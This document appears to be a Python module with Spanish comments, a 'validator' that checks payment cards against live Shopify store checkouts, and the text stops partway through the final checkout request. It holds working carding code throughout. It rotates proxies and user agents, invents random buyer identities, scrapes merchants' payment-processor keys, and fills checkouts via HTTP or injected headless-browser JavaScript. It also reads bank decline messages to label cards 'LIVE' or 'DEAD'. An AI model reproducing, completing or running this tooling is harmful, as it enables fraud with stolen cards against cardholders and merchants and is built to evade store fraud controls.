"""
samaritan/validator.py
======================

Motor de validación de tarjetas contra checkout de Shopify.

Diseño: CADENA DE INTENTOS TOTAL
--------------------------------
Cada validación recorre una lista ordenada de rutas. Ninguna ruta es terminal.
Una ruta puede:

    (a) emitir un Verdict          -> la cadena corta y devuelve
    (b) devolver None              -> "no aplico a esta tienda", sigue la siguiente
    (c) lanzar excepción / timeout -> sigue la siguiente

La última ruta de la cadena es SIEMPRE el navegador headless. Consecuencia:
`ERROR AUTH` deja de ser alcanzable por diseño y el modo de fallo pasa de
"no sé qué hacer" a "tardó más".

Orden de la cadena (deliberadamente invertido respecto al port original):

    1. http_checkout   -> primaria. Agnóstica al procesador, sin claves, sin navegador.
    2. <procesador>    -> condicional. Solo si la tienda expone las claves que exige.
    3. browserless     -> fallback universal. Cierre garantizado.

Requiere: aiohttp, beautifulsoup4, lxml.  Python 3.11+
"""

from __future__ import annotations

import asyncio
import ipaddress
import json
import logging
import os
import random
import re
import socket
import time
from dataclasses import dataclass, field
from typing import Awaitable, Callable, Optional
from urllib.parse import urlparse, urljoin

import aiohttp
from bs4 import BeautifulSoup

log = logging.getLogger("samaritan.validator")

# ---------------------------------------------------------------------------
# Veredictos normalizados (ver C-14: etiquetas honestas, no colapsar LIVE CCN
# con LIVE AUTH — son cosas distintas y mezclarlas invalida la telemetría).
# ---------------------------------------------------------------------------
LIVE_AUTH = "LIVE AUTH"   # el banco respondió: funds / AVS / CVV / thank_you
LIVE_3DS  = "LIVE 3DS"    # challenge 3DS disparado
LIVE_CCN  = "LIVE CCN"    # tarjeta válida, solo se validó el token
LIVE      = "LIVE"        # respuesta ambigua pero no rechazo
DEAD_AUTH = "DEAD AUTH"   # rechazo del banco
DEAD      = "DEAD"        # rechazo local (Luhn)
ERROR     = "ERROR AUTH"  # ninguna ruta concluyó

# ---------------------------------------------------------------------------
# Timeouts por ruta. El navegador tiene más porque su trabajo es más lento.
# ---------------------------------------------------------------------------
TIMEOUTS: dict[str, float] = {
    "http_checkout":   45.0,
    "stripe_direct":   25.0,
    "braintree_direct": 25.0,
    "authnet_direct":  25.0,
    "browserless":     75.0,
}

BL_URL = "https://chrome.browserless.io/function"

# ---------------------------------------------------------------------------
# Firmas de procesador. El orden importa: las pasarelas de tarjeta van antes
# que las wallets, porque una tienda con PayPal suele tener además su gateway.
# ---------------------------------------------------------------------------
_PROCESSOR_SIGNATURES: tuple[tuple[str, tuple[str, ...]], ...] = (
    ("SHOPIFY_PAYMENTS", (r"shopify_payments", r"Shopify\.Payments", r"shopify-payments")),
    ("STRIPE",           (r"js\.stripe\.com", r"stripe\.com/v3", r"pk_live_", r"pk_test_")),
    ("BRAINTREE",        (r"braintreegateway\.com", r"braintree-web", r"tokenizationKey", r"client_token")),
    ("AUTHORIZE_NET",    (r"accept\.js", r"jst\.authorize\.net", r"apiLoginID")),
    ("ADYEN",            (r"checkoutshopper-live", r"adyen\.com", r"adyenCheckout")),
    ("PAYPAL",           (r"paypal\.com/sdk", r"paypalobjects")),
    ("KLARNA",           (r"klarna")),
    ("AFTERPAY",         (r"afterpay")),
    ("SQUARE",           (r"squareup\.com", r"square\.js")),
)

# Procesadores con flujo incompatible con el checkout clásico.
UNSUPPORTED_PROCESSORS: frozenset[str] = frozenset({"PAYPAL", "KLARNA", "AFTERPAY", "SQUARE"})

_RE_STRIPE_PK    = re.compile(r"\b(pk_(?:live|test)_[A-Za-z0-9]{10,})\b")
_RE_BRAINTREE_TK = re.compile(r"\b((?:production|sandbox)_[a-z0-9]{8,}_[a-z0-9]{8,})\b")
_RE_ANET_LOGIN   = re.compile(r'["\']apiLoginID["\']\s*:\s*["\']([A-Za-z0-9]{6,})["\']')
_RE_ANET_CLIENT  = re.compile(r'["\']clientKey["\']\s*:\s*["\']([A-Za-z0-9\-]{10,})["\']')
_RE_CHECKOUT_TOK = re.compile(r'checkout_token["\']?\s*[:=]\s*["\']([a-f0-9]{20,})["\']')
_RE_ALT_TOKEN    = re.compile(r"/checkouts/([a-f0-9]{20,})")
_RE_GATEWAY_ID   = re.compile(r'name="checkout\[payment_gateway_id\]"\s+value="(\d+)"')
_RE_GATEWAY_ALT  = re.compile(r'payment_gateway_id["\']?\s*[:=]\s*["\']?(\d+)')
_RE_AUTHTOKEN    = re.compile(r'name="authenticity_token"\s+value="([^"]+)"')
_RE_VARIANT_JS   = re.compile(r'"variants"\s*:\s*\[\s*\{[^}]*?"id"\s*:\s*(\d+)')
_RE_PRICE        = re.compile(r'"price"\s*:\s*(\d+)')
_RE_NOTICE       = re.compile(r'notice__text[^>]*>(.*?)</', re.S)

# Señales de respuesta. Orden de evaluación: LIVE antes que DEAD.
_CVV_LIVE    = ("incorrect cvv", "cvv is incorrect", "incorrect security code",
                "security code is incorrect", "incorrect verification value")
_FUNDS_LIVE  = ("insufficient funds", "not sufficient funds", "insufficient_funds")
_AVS_LIVE    = ("incorrect zip", "incorrect postal", "incorrect address",
                "address mismatch", "zip is incorrect", "postal code is incorrect")
_DEAD        = ("card was declined", "declined", "do not honor", "expired card",
                "invalid card number", "pick up card", "card_declined",
                "invalid_expiry", "expired_card", "invalid_cvc")

_USER_AGENTS = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
)


# ===========================================================================
# Dataclasses
# ===========================================================================

@dataclass(slots=True)
class Verdict:
    status: str
    message: str
    route: str = "?"
    processor: str = "?"
    gateway: str = "?"
    latency_ms: int = 0

    @property
    def is_live(self) -> bool:
        return self.status.startswith("LIVE")

    def as_dict(self) -> dict:
        return {
            "status": self.status, "message": self.message, "route": self.route,
            "processor": self.processor, "gateway": self.gateway,
            "latency_ms": self.latency_ms,
        }


@dataclass(slots=True)
class Attempt:
    name: str
    run: Callable[[], Awaitable[Optional[Verdict]]]


@dataclass(slots=True)
class Card:
    number: str
    month: str
    year: str
    cvv: str

    @property
    def bin8(self) -> str:
        return self.number[:8]

    @property
    def brand(self) -> str:
        return brand_from_iin(self.number)

    @property
    def masked(self) -> str:
        return f"{self.number[:6]}****{self.number[-4:]}"

    def wire(self) -> str:
        return f"{self.masked}|{self.month}|{self.year}|{self.cvv}"


@dataclass(slots=True)
class Analysis:
    url: str
    base_url: str
    processor: str
    country: str
    variant_id: Optional[str] = None
    price: Optional[str] = None
    public_keys: list[str] = field(default_factory=list)
    braintree_key: Optional[str] = None
    anet_login: Optional[str] = None
    anet_client: Optional[str] = None
    gateway_id: Optional[str] = None
    stripe_client_secret: Optional[str] = None
    is_classic_checkout: bool = True
    html_len: int = 0
    fetched_at: float = 0.0


@dataclass(slots=True)
class Identity:
    first: str
    last: str
    email: str
    address: str
    city: str
    zip_code: str
    country: str
    phone: str

    @property
    def full_name(self) -> str:
        return f"{self.first} {self.last}"


# ===========================================================================
# Helpers puros
# ===========================================================================

def luhn(number: str) -> bool:
    digits = [int(d) for d in number if d.isdigit()]
    if len(digits) < 12:
        return False
    checksum = 0
    for i, d in enumerate(reversed(digits)):
        if i % 2:
            d *= 2
            if d > 9:
                d -= 9
        checksum += d
    return checksum % 10 == 0


def brand_from_iin(number: str) -> str:
    """Marca determinista por IIN. No necesita red — es la capa final de la
    cascada de BIN cuando no hay CSV ni API disponible."""
    if not number:
        return "N/A"
    two, four = number[:2], number[:4]
    if number[0] == "4":
        return "VISA"
    if 51 <= int(two) <= 55 or 2221 <= int(four) <= 2720:
        return "MASTERCARD"
    if two in ("34", "37"):
        return "AMEX"
    if four == "6011" or two == "65":
        return "DISCOVER"
    if two in ("36", "38", "30", "39"):
        return "DINERS"
    if four in ("3528", "3529", "3530"):
        return "JCB"
    return "N/A"


def normalize_card(raw: str) -> Card:
    """Acepta `cc|mm|yy|cvv`, `cc/mm/yy/cvv`, `cc mm yy cvv` y variantes."""
    parts = [p for p in re.split(r"[|/\s]+", raw.strip()) if p]
    if len(parts) != 4:
        raise ValueError("Se esperaban 4 campos: cc|mm|yy|cvv")
    number, month, year, cvv = parts
    number = re.sub(r"\D", "", number)
    if not number.isdigit() or len(number) < 13:
        raise ValueError("Número de tarjeta inválido")
    month = month.zfill(2)
    if not 1 <= int(month) <= 12:
        raise ValueError("Mes inválido")
    if len(year) == 4:
        year = year[-2:]
    if len(year) == 1:
        year = "0" + year
    cvv = re.sub(r"\D", "", cvv)
    return Card(number=number, month=month, year=year, cvv=cvv)


_TLD = {
    "com.mx": "MX", "com.co": "CO", "com.br": "BR", "com.ar": "AR",
    "com.pe": "PE", "com.au": "AU", "com.ca": "CA", "co.uk": "GB",
    "co.nz": "NZ", "mx": "MX", "ca": "CA", "us": "US", "br": "BR",
    "ar": "AR", "cl": "CL", "co": "CO", "au": "AU", "uk": "GB",
    "nz": "NZ", "es": "ES", "pe": "PE",
}


def detect_country(url: str) -> str:
    """`endswith('.' + tld)` en vez de `in` — evita que `.casa` matchee `.ca`.
    Orden por longitud descendente para que `com.mx` gane a `mx`."""
    host = urlparse(url).netloc.lower().split(":")[0]
    for tld in sorted(_TLD, key=len, reverse=True):
        if host.endswith("." + tld):
            return _TLD[tld]
    return "US"


def _base_url(url: str) -> str:
    p = urlparse(url if "://" in url else "https://" + url)
    return f"{p.scheme or 'https'}://{p.netloc}"


def _extract_notice(html: str) -> str:
    if not html:
        return ""
    soup = BeautifulSoup(html, "lxml")
    node = soup.select_one(".notice__text, [data-testid='notice'], .notice")
    if node:
        return node.get_text(" ", strip=True)
    m = _RE_NOTICE.search(html)
    if m:
        return BeautifulSoup(m.group(1), "lxml").get_text(" ", strip=True)
    return ""


def _extract_checkout_token(html: str, final_url: str) -> Optional[str]:
    for source in (final_url, html):
        m = _RE_CHECKOUT_TOK.search(source) or _RE_ALT_TOKEN.search(source)
        if m:
            return m.group(1)
    return None


def _parse_shipping_rate(html: str) -> Optional[str]:
    soup = BeautifulSoup(html, "lxml")
    node = soup.select_one('input[name="checkout[shipping_rate][id]"]')
    if node and node.get("value"):
        return node["value"]
    for radio in soup.select('input[type="radio"][name*="shipping_rate"]'):
        if radio.get("value"):
            return radio["value"]
    m = re.search(r'"shipping_rate"\s*:\s*\{\s*"id"\s*:\s*"([^"]+)"', html)
    return m.group(1) if m else None


def random_identity(country: str = "US") -> Identity:
    firsts = ("James", "Michael", "Robert", "Daniel", "Carlos", "Luis", "Ana", "Sofia")
    lasts = ("Smith", "Johnson", "Brown", "Garcia", "Martinez", "Lopez", "Davis")
    first, last = random.choice(firsts), random.choice(lasts)
    tag = random.randint(100, 9999)
    return Identity(
        first=first,
        last=last,
        email=f"{first.lower()}.{last.lower()}{tag}@gmail.com",
        address=f"{random.randint(100, 9999)} {random.choice(('Main','Oak','Park','Cedar'))} St",
        city=random.choice(("New York", "Los Angeles", "Chicago", "Miami", "Austin")),
        zip_code=f"{random.randint(10000, 99999)}",
        country=country,
        phone=f"+1{random.randint(200, 999)}{random.randint(1000000, 9999999)}",
    )


async def is_public_host(host: str) -> bool:
    """Guarda SSRF: `getaddrinfo` es bloqueante -> fuera del event loop."""
    def _resolve() -> bool:
        try:
            infos = socket.getaddrinfo(host, None)
        except socket.gaierror:
            return False
        for info in infos:
            ip = ipaddress.ip_address(info[4][0])
            if ip.is_private or ip.is_loopback or ip.is_link_local:
                return False
        return True

    return await asyncio.to_thread(_resolve)


# ===========================================================================
# JavaScript inyectado en Browserless
# ===========================================================================

# Convención obligatoria: TODO código inyectado termina con
#     return { data: <objeto>, type: 'application/json' }
# `_bl_call` normaliza la respuesta en un único punto.
_BL_CHECKOUT_JS = r"""
module.exports = async ({ page, context }) => {
  const { base, variantId, card, month, year, cvv, identity } = context;
  const sleep = ms => new Promise(r => setTimeout(r, ms));

  // Interceptación: puede fallar si la página la trae ya activa.
  try { await page.setRequestInterception(true); } catch (_) {}
  page.on('request', req => { try { req.continue(); } catch (_) {} });

  const setValue = async (selector, value) => {
    try {
      await page.waitForSelector(selector, { timeout: 5000 });
      await page.click(selector, { clickCount: 3 });
      await page.type(selector, value, { delay: 15 });
      return true;
    } catch (_) { return false; }
  };

  // CORREGIDO: page.select() espera un selector CSS plano, no un objectId CDP.
  const setSelect = async (selector, value) => {
    try {
      await page.waitForSelector(selector, { timeout: 5000 });
      const chosen = await page.select(selector, value);
      if (chosen && chosen.length) return true;
    } catch (_) {}
    try {
      await page.focus(selector);
      await page.type(selector, value, { delay: 20 });
      await page.keyboard.press('Enter');
    } catch (_) {}
    return false;
  };

  const fillInFrame = async (hint, value) => {
    for (const frame of page.frames()) {
      const tag = ((frame.name() || '') + ' ' + (frame.url() || '')).toLowerCase();
      if (!tag.includes(hint)) continue;
      try {
        const input = await frame.$('input:not([type="hidden"])');
        if (!input) continue;
        await input.click();
        await input.type(value, { delay: 20 });
        return true;
      } catch (_) {}
    }
    return false;
  };

  const fillCardField = async (hints, value) => {
    for (const hint of hints) {
      if (await fillInFrame(hint, value)) return true;
    }
    return false;
  };

  // 1) Carrito + checkout
  await page.goto(base + '/cart/add.js?id=' + encodeURIComponent(variantId) + '&quantity=1',
                  { waitUntil: 'domcontentloaded', timeout: 30000 }).catch(() => {});
  await page.goto(base + '/checkout', { waitUntil: 'domcontentloaded', timeout: 30000 });

  // 2) Contacto
  await setValue('input[name="checkout[email]"]', identity.email);
  await setValue('#email', identity.email);
  await setValue('input[name="checkout[shipping_address][first_name]"]', identity.first);
  await setValue('input[name="checkout[shipping_address][last_name]"]', identity.last);
  await setValue('input[name="checkout[shipping_address][address1]"]', identity.address);
  await setValue('input[name="checkout[shipping_address][city]"]', identity.city);
  await setValue('input[name="checkout[shipping_address][zip]"]', identity.zip_code);
  await setSelect('select[name="checkout[shipping_address][country]"]', identity.country);
  await sleep(700);
  await setSelect('select[name="checkout[shipping_address][province]"]', identity.city);
  await setSelect('select[name="checkout[shipping_address][province_code]"]', identity.city);

  const click = async (selectors) => {
    for (const sel of selectors) {
      try {
        const el = await page.$(sel);
        if (el) { await el.click(); return true; }
      } catch (_) {}
    }
    return false;
  };

  await click(['button#continue_button', 'button[name="button"]',
               'button[type="submit"]', '#continue_button']);
  await sleep(2500);

  // 3) Método de envío
  await click(['input[name="checkout[shipping_rate][id]"]',
               '.shipping-method input[type="radio"]']);
  await sleep(600);
  await click(['button#continue_button', 'button[name="button"]', 'button[type="submit"]']);
  await sleep(3000);

  // 4) Tarjeta (los campos viven en iframes de la pasarela)
  await fillCardField(['card-fields-number', 'number'], card);
  await fillCardField(['card-fields-expiry', 'expiry', 'expiration'], month + year);
  await fillCardField(['card-fields-verification', 'verification', 'cvv', 'security'], cvv);
  await fillCardField(['card-fields-name', 'name'], identity.full_name);
  await setValue('input[name="checkout[credit_card][name]"]', identity.full_name);
  await sleep(900);

  // 5) Pago
  await click(['button#checkout-pay-button', 'button[data-testid="CheckoutPayButton"]',
               'button#continue_button', 'button[type="submit"]']);

  // 6) Espera del resultado
  let notice = '';
  for (let i = 0; i < 40; i++) {
    await sleep(500);
    const u = page.url();
    if (u.includes('/thank_you') || u.includes('/processing') || u.includes('/3d_secure')) break;
    try {
      notice = await page.$eval('.notice__text, [data-testid="notice"], .notice',
                                el => (el.innerText || '').trim());
      if (notice) break;
    } catch (_) {}
  }

  const body = await page.evaluate(
    () => (document.body ? document.body.innerText : '')).catch(() => '');

  return {
    data: { url: page.url(), notice: notice, body: body.slice(0, 4000) },
    type: 'application/json'
  };
};
"""

_BL_STRIPE_JS = r"""
module.exports = async ({ page, context }) => {
  const { url, card, month, year, cvv, identity } = context;
  const sleep = ms => new Promise(r => setTimeout(r, ms));

  try { await page.setRequestInterception(true); } catch (_) {}
  page.on('request', req => { try { req.continue(); } catch (_) {} });

  let stripeResult = null;
  page.on('response', async resp => {
    const u = resp.url();
    if (!u.includes('api.stripe.com')) return;
    try {
      const body = await resp.json();
      stripeResult = body;
    } catch (_) {}
  });

  await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 30000 });

  // Botón de compra directa si existe; si no, vamos al checkout.
  const buy = await page.$('button[name="add"], .product-form__submit, button[type="submit"]');
  if (buy) { await buy.click().catch(() => {}); await sleep(2500); }
  await page.goto(context.base + '/checkout', { waitUntil: 'domcontentloaded', timeout: 30000 });

  const setValue = async (sel, val) => {
    try {
      await page.waitForSelector(sel, { timeout: 4000 });
      await page.click(sel, { clickCount: 3 });
      await page.type(sel, val, { delay: 15 });
      return true;
    } catch (_) { return false; }
  };
  const setSelect = async (sel, val) => {
    try {
      await page.waitForSelector(sel, { timeout: 4000 });
      const r = await page.select(sel, val);
      if (r && r.length) return true;
    } catch (_) {}
    return false;
  };

  await setValue('input[name="checkout[email]"]', identity.email);
  await setValue('input[name="checkout[shipping_address][first_name]"]', identity.first);
  await setValue('input[name="checkout[shipping_address][last_name]"]', identity.last);
  await setValue('input[name="checkout[shipping_address][address1]"]', identity.address);
  await setValue('input[name="checkout[shipping_address][city]"]', identity.city);
  await setValue('input[name="checkout[shipping_address][zip]"]', identity.zip_code);
  await setSelect('select[name="checkout[shipping_address][country]"]', identity.country);

  const click = async (sels) => {
    for (const s of sels) {
      try { const el = await page.$(s); if (el) { await el.click(); return true; } } catch (_) {}
    }
    return false;
  };
  await click(['button#continue_button', 'button[name="button"]', 'button[type="submit"]']);
  await sleep(2500);
  await click(['input[name="checkout[shipping_rate][id]"]']);
  await sleep(600);
  await click(['button#continue_button', 'button[type="submit"]']);
  await sleep(3000);

  const fillFrame = async (hint, value) => {
    for (const frame of page.frames()) {
      const tag = ((frame.name() || '') + ' ' + (frame.url() || '')).toLowerCase();
      if (!tag.includes(hint)) continue;
      try {
        const input = await frame.$('input:not([type="hidden"])');
        if (!input) continue;
        await input.click();
        await input.type(value, { delay: 20 });
        return true;
      } catch (_) {}
    }
    return false;
  };
  for (const [hints, val] of [
    [['card-fields-number', 'number'], card],
    [['card-fields-expiry', 'expiry'], month + year],
    [['card-fields-verification', 'verification', 'cvv'], cvv],
  ]) {
    for (const h of hints) { if (await fillFrame(h, val)) break; }
  }
  await sleep(900);

  await click(['button#checkout-pay-button', 'button[data-testid="CheckoutPayButton"]',
               'button#continue_button', 'button[type="submit"]']);

  let notice = '';
  for (let i = 0; i < 30; i++) {
    await sleep(500);
    if (stripeResult) break;
    const u = page.url();
    if (u.includes('/thank_you') || u.includes('/processing')) break;
    try {
      notice = await page.$eval('.notice__text, .notice', el => (el.innerText || '').trim());
      if (notice) break;
    } catch (_) {}
  }

  return {
    data: {
      url: page.url(),
      notice: notice,
      stripe: stripeResult
    },
    type: 'application/json'
  };
};
"""


# ===========================================================================
# Validador
# ===========================================================================

class CardValidator:
    """Cadena de intentos total. Ver docstring del módulo."""

    def __init__(
        self,
        *,
        proxies: Optional[list[str]] = None,
        browserless_token: Optional[str] = None,
        bin_table: Optional[dict[str, dict]] = None,
        cache_ttl: float = 900.0,
        on_verdict: Optional[Callable[[Verdict, Card], Awaitable[None]]] = None,
    ) -> None:
        raw_proxies = proxies if proxies is not None else (
            os.getenv("SHOPIFY_PROXIES", "").split(",") if os.getenv("SHOPIFY_PROXIES") else []
        )
        self._proxies = [p.strip() for p in raw_proxies if p and p.strip()]
        self._bl_token = browserless_token or os.getenv("BROWSERLESS_TOKEN")
        self._bin_table = bin_table or {}
        self._cache_ttl = cache_ttl
        self._cache: dict[str, Analysis] = {}
        self._on_verdict = on_verdict
        self._telemetry_tasks: set[asyncio.Task] = set()

    # -- infraestructura ---------------------------------------------------

    def _pick_proxy(self) -> Optional[str]:
        if not self._proxies:
            return None
        raw = random.choice(self._proxies)
        if "://" in raw:
            return raw
        # user:pass@host:port -> con esquema
        return "http://" + raw

    def _new_session(self) -> aiohttp.ClientSession:
        """Sesión POR INTENTO. `asyncio.wait_for` cancela el coroutine y una
        sesión compartida puede quedar con conexiones a medio cerrar."""
        headers = {
            "User-Agent": random.choice(_USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/json;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
        }
        return aiohttp.ClientSession(
            headers=headers,
            timeout=aiohttp.ClientTimeout(total=60),
            proxy=self._pick_proxy(),
            trust_env=True,
        )

    async def _bl_call(self, code: str, context: dict) -> dict:
        """Única puerta de salida hacia Browserless.

        CONVENCIÓN: el código inyectado devuelve {data: <objeto>, type: '...'}.
        Browserless publica ese `data` como cuerpo. Normalizamos por si viene
        envuelto o doblemente serializado, para que ninguna ruta tenga que
        asumir un comportamiento distinto.
        """
        payload: dict = {"code": code, "context": context}
        if self._bl_token:
            payload["token"] = self._bl_token

        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=90)
        ) as session:
            async with session.post(BL_URL, json=payload) as resp:
                resp.raise_for_status()
                raw = await resp.json()

        if isinstance(raw, dict) and set(raw) == {"data"}:
            raw = raw["data"]
        if isinstance(raw, str):
            try:
                raw = json.loads(raw)
            except json.JSONDecodeError:
                pass
        return raw if isinstance(raw, dict) else {}

    # -- análisis de tienda ------------------------------------------------

    async def _analyze(self, url: str) -> Analysis:
        cached = self._cache.get(url)
        if cached and (time.time() - cached.fetched_at) < self._cache_ttl:
            return cached

        base = _base_url(url)
        host = urlparse(base).netloc.split(":")[0]
        if not await is_public_host(host):
            raise ValueError(f"Host no público: {host}")

        async with self._new_session() as session:
            async with session.get(url, allow_redirects=True) as resp:
                html = await resp.text(errors="ignore")
                final = str(resp.url)

        analysis = Analysis(
            url=url,
            base_url=_base_url(final),
            processor="UNKNOWN",
            country=detect_country(final),
            html_len=len(html),
            fetched_at=time.time(),
        )

        analysis.processor = self._detect_processor(html)
        analysis.public_keys = list(dict.fromkeys(_RE_STRIPE_PK.findall(html)))[:3]

        if m := _RE_BRAINTREE_TK.search(html):
            analysis.braintree_key = m.group(1)
        if m := _RE_ANET_LOGIN.search(html):
            analysis.anet_login = m.group(1)
        if m := _RE_ANET_CLIENT.search(html):
            analysis.anet_client = m.group(1)
        if m := _RE_GATEWAY_ID.search(html) or _RE_GATEWAY_ALT.search(html):
            analysis.gateway_id = m.group(1)

        # El checkout clásico se delata por la presencia del tokenizador.
        # Sin esa marca, el flujo HTTP no aplica y dejamos pasar a Browserless.
        analysis.is_classic_checkout = "deposit.us.shopifycs.com" in html

        analysis.variant_id = await self._resolve_variant(analysis)

        if analysis.processor == "STRIPE" and analysis.public_keys:
            analysis.stripe_client_secret = await self._fetch_client_secret(analysis)

        self._cache[url] = analysis
        log.info(
            "análisis %s -> proc=%s classic=%s variant=%s keys=%d",
            base, analysis.processor, analysis.is_classic_checkout,
            bool(analysis.variant_id), len(analysis.public_keys),
        )
        return analysis

    @staticmethod
    def _detect_processor(html: str) -> str:
        low = html.lower()
        for name, patterns in _PROCESSOR_SIGNATURES:
            for pat in patterns:
                if re.search(pat.lower(), low):
                    return name
        return "UNKNOWN"

    async def _resolve_variant(self, analysis: Analysis) -> Optional[str]:
        m = re.search(r"/products/([^/?#]+)", analysis.url)
        if not m:
            m2 = _RE_VARIANT_JS.search(analysis.url)
            return m2.group(1) if m2 else None
        handle = m.group(1)
        try:
            async with self._new_session() as session:
                async with session.get(f"{analysis.base_url}/products/{handle}.js") as resp:
                    if resp.status != 200:
                        return None
                    data = await resp.json(content_type=None)
            variants = data.get("variants") or []
            if variants:
                analysis.price = f"{variants[0].get('price', '?')}"
                return str(variants[0]["id"])
        except Exception:
            log.warning("no pude resolver variante de %s", analysis.url, exc_info=True)
        return None

    async def _fetch_client_secret(self, analysis: Analysis) -> Optional[str]:
        """El client_secret de un PaymentIntent vive en el HTML del checkout."""
        try:
            async with self._new_session() as session:
                async with session.get(f"{analysis.base_url}/checkout") as resp:
                    html = await resp.text(errors="ignore")
            m = re.search(r'"client_secret"\s*:\s*"(pi_[^"]+)"', html)
            if m:
                return m.group(1)
            m = re.search(r"\b(pi_[A-Za-z0-9_]+_secret_[A-Za-z0-9]+)\b", html)
            return m.group(1) if m else None
        except Exception:
            return None

    # -- cadena ------------------------------------------------------------

    def _build_chain(self, analysis: Analysis, card: Card) -> list[Attempt]:
        proc = analysis.processor
        if proc in UNSUPPORTED_PROCESSORS:
            return []

        chain: list[Attempt] = [
            # 1) PRIMARIA. Agnóstica, sin claves, sin navegador.
            Attempt("http_checkout", lambda: self._http_checkout(analysis, card)),
        ]

        # 2) Condicional: solo si la tienda expone las claves que la ruta exige.
        if proc == "STRIPE" and analysis.public_keys:
            chain.append(Attempt("stripe_direct", lambda: self._stripe_direct(analysis, card)))
        elif proc == "BRAINTREE" and analysis.braintree_key:
            chain.append(Attempt("braintree_direct", lambda: self._braintree_direct(analysis, card)))
        elif proc == "AUTHORIZE_NET" and analysis.anet_login and analysis.anet_client:
            chain.append(Attempt("authnet_direct", lambda: self._authnet_direct(analysis, card)))

        # 3) UNIVERSAL. Cierre garantizado.
        chain.append(Attempt("browserless", lambda: self._browserless(analysis, card)))
        return chain

    async def validate(self, raw_card: str | Card, gate) -> Verdict:
        card = raw_card if isinstance(raw_card, Card) else normalize_card(raw_card)

        if not luhn(card.number):
            return Verdict(DEAD, "Luhn inválido", route="local",
                           processor="?", gateway=getattr(gate, "name", "?"))

        try:
            analysis = await self._analyze(gate.url)
        except Exception as exc:
            return Verdict(ERROR, f"Análisis falló: {type(exc).__name__}",
                           route="analyze", gateway=getattr(gate, "name", "?"))

        chain = self._build_chain(analysis, card)
        if not chain:
            return Verdict(ERROR, f"Procesador no soportado: {analysis.processor}",
                           processor=analysis.processor, gateway=getattr(gate, "name", "?"))

        tried: list[str] = []
        for attempt in chain:
            t0 = time.perf_counter()
            try:
                verdict = await asyncio.wait_for(
                    attempt.run(), timeout=TIMEOUTS.get(attempt.name, 30.0)
                )
            except asyncio.TimeoutError:
                log.warning("ruta %s timeout", attempt.name)
                tried.append(f"{attempt.name}=timeout")
                continue
            except Exception:
                log.exception("ruta %s excepción", attempt.name)
                tried.append(f"{attempt.name}=exc")
                continue

            if verdict is None:
                tried.append(f"{attempt.name}=na")
                continue

            verdict.route = attempt.name
            verdict.processor = analysis.processor
            verdict.gateway = getattr(gate, "name", "?")
            verdict.latency_ms = int((time.perf_counter() - t0) * 1000)
            self._emit(verdict, card)
            return verdict

        return Verdict(ERROR, "Sin respuesta concluyente. Rutas: " + ", ".join(tried),
                       processor=analysis.processor, gateway=getattr(gate, "name", "?"))

    def _emit(self, verdict: Verdict, card: Card) -> None:
        if not self._on_verdict:
            return
        task = asyncio.create_task(self._on_verdict(verdict, card))
        self._telemetry_tasks.add(task)
        task.add_done_callback(self._telemetry_tasks.discard)

    # -----------------------------------------------------------------------
    # RUTA 1 — HTTP checkout. Primaria, agnóstica al procesador.
    # -----------------------------------------------------------------------
    async def _http_checkout(self, analysis: Analysis, card: Card) -> Optional[Verdict]:
        if not analysis.variant_id:
            return None
        if not analysis.is_classic_checkout:
            # Checkout new-style (/checkouts/cn/): no hay tokenizador clásico.
            # Devolvemos None para que el fallback headless lo maneje.
            return None

        base = analysis.base_url
        identity = random_identity(analysis.country)
        t0 = time.perf_counter()

        async with self._new_session() as session:
            # 1) carrito
            async with session.post(f"{base}/cart/add.js",
                                    data={"id": analysis.variant_id, "quantity": 1}) as r:
                if r.status >= 400:
                    return None

            # 2) abrir checkout y extraer token
            async with session.get(f"{base}/checkout/", allow_redirects=True) as r:
                html = await r.text(errors="ignore")
                final = str(r.url)

            token = _extract_checkout_token(html, final)
            if not token:
                return None
            if "deposit.us.shopifycs.com" not in html:
                return None

            # 3) contacto + dirección
            html = await self._patch_checkout(session, base, token, {
                "checkout[email]": identity.email,
                "checkout[buyer_accepts_marketing]": "0",
                "checkout[shipping_address][first_name]": identity.first,
                "checkout[shipping_address][last_name]": identity.last,
                "checkout[shipping_address][address1]": identity.address,
                "checkout[shipping_address][city]": identity.city,
                "checkout[shipping_address][zip]": identity.zip_code,
                "checkout[shipping_address][country]": identity.country,
                "checkout[shipping_address][phone]": identity.phone,
                "step": "contact_information",
            })
            if html is None:
                return None

            # 4) método de envío
            rate = _parse_shipping_rate(html)
            if rate:
                html = await self._patch_checkout(session, base, token, {
                    "checkout[shipping_rate][id]": rate,
                    "step": "shipping_method",
                }) or html

            # 5) página de pago -> gateway + authenticity token
            payment_html = await self._patch_checkout(session, base, token, {
                "step": "payment_method",
            }) or html

            m = _RE_GATEWAY_ID.search(payment_html) or _RE_GATEWAY_ALT.search(payment_html)
            gateway_id = m.group(1) if m else analysis.gateway_id
            if not gateway_id:
                return None

            auth_m = _RE_AUTHTOKEN.search(payment_html)
            authenticity = auth_m.group(1) if auth_m else ""

            # 6) tokenizar en deposit.us.shopifycs.com
            deposit_token = await self._tokenize_deposit(session, base, card, identity)
            if not deposit_token:
                return None

            # 7) completar
            payload = {
                "_method": "patch",
                "authenticity_token": authenticity,
                "previous_step": "payment_method",
                "step": "",
                "checkout[payment_gateway_id]": gateway_id,
                "checkout[credit_card][token]": deposit_token,
                "checkout[credit_card][payment_token]": deposit_token,
                "checkout[credit_card][month]": card.month,
                "checkout[credit_card][year]": card.year,
                "checkout[credit_card][verification_value]": card.cvv,
                "checkout[credit_card][name]": identity.full_name,
                "checkout[email]": identity.email,
                "checkout[shipping_address][first_name]": identity.first,
                "checkout[shipping_address][last_name]": identity.last,
                "checkout[shipping_address][address1]": identity.address,
                "checkout[shipping_address][city]": identity.city,
                "checkout[shipping_address][zip]": identity.zip_code,
                "checkout[shipping_address][country]": identity.country,
                "checkout[shipping_address][phone]": identity.phone,
                "checkout[complete]": "1",
                "complete": "1",
            }
